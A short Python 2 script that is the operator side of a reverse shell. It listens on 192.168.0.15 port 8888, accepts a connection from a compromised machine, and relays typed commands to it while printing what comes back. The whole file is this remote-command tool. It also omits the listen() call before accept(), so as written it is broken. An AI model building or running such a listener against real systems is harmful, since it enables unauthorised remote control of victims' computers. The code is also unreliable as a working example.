import subprocess
import socket
import os
listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listner.bind(('192.168.0.15', 8888))
connection, address = listner.accept()
print("[+] Connection established - " + str(address))

while True:
    command = raw_input("----> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)












































